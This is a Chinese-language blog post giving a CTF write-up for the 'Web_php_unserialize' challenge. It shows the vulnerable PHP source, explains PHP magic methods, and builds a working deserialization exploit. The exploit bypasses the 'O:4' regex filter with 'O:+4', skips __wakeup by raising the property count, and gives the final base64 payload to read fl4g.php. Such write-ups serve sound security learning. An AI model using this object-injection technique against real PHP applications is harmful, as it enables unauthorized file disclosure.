---
layout:     post               # 使用的布局（不需要改）
title:      Web_php_unserialize    # 标题 
subtitle:    攻防世界   #副标题
date:       2020-07-13         # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - CTF
  
---


```
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

`preg_match()`返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。

`unserialize()` 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。  若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 `__wakeup()` 成员函数（如果存在的话）。 

`serialize()` 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。

 与之相反，`unserialize()` 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。

`__wakeup()` 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。 

`__desturct()`生命周期结束时，则调用desturct()。

知道了函数的作用，也就差不多理解了这段代码的意思。

先base64解码GET接收到的变量`$var`,然后进行正则匹配检测，如果匹配到了就失败了。没匹配到就会执行解序列化。

在反序列化时 ， PHP 会先执行 __wakeup() 函数 . 本题中 __wakeup() 函数的作用为 : 将 $file 变量强制赋值为 index.php ， 而题目又提示 flag 在 fl4g.php 中 ， 因此这又牵扯到一个问题了 : 如何绕过 __wakeup() 函数。

解题开始：

* 绕过正则

正则匹配的规则是: 在不区分大小写的情况下 ， 若字符串出现 "o:数字" 或者 "c:数字' 这样的格式 ， 那么就被过滤。

但是我们进行序列化Demo对象时，必将会出现`O:4:`,所以我们得绕过。

直接在4前面加一个加号`+`.

* 绕过__wakeup()

我们仅需要破坏对象属性检查就可以绕过 `__wakeup()` 函数 ， 最简单的方法就是增大对象属性的个数 ， 使其反序列化异常 .

* 构造exp

```
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
    $obj = new Demo('fl4g.php');
    $str = serialize($obj);
    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
    $str1 = str_replace('O:4', 'O:+4',$str);//绕过preg_match
    $str2 = str_replace(':1:', ':2:',$str1);//绕过wakeup
    var_dump($str2);
    //string(49) "O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}"
    var_dump(base64_encode($str2));
    //string(68) "TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ=="
?>
```

Exp : `TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==`

之后提交`var`变量即可。

![UYr590.png](https://s1.ax1x.com/2020/07/13/UYr590.png)

**ps:**

之前我把生成的对象序列化之后输出，复制之后，手工替换`绕过正则`和`__wake`,base64编码之后，发现解不出题...........

看了大佬[博客](https://www.guildhab.top/?p=990)才知道。

**不同属性的对象序列化后字符格式是不一样的**

```
Private属性 ： 数据类型:属性名长度:&quot;\00类名\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;

Protected属性 ： 数据类型:属性名长度:&quot;\00*\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;

Public属性 ： 数据类型:属性名长度:&quot;属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;
```

1、将序列化之后的字符串直接存入文件。

    $obj = new Demo('fl4g.php');
    $str = serialize($obj);
    $file=fopen("a.txt","w") or die("can't open file");
   fwrite($file,$str);
    fclose($file);

2、将序列化后的字符串输出，直接复制粘贴到文件。

	echo $str;

3、vim查看a.txt

![UYD6oR.png](https://s1.ax1x.com/2020/07/13/UYD6oR.png)

输出到命令行的序列化字符串格式已经被破坏 ， 因此必须要在脚本中直接构造出完整的 Exp

参考：https://www.guildhab.top/?p=990

反序列化漏洞： https://www.jianshu.com/p/1d2c65601d2a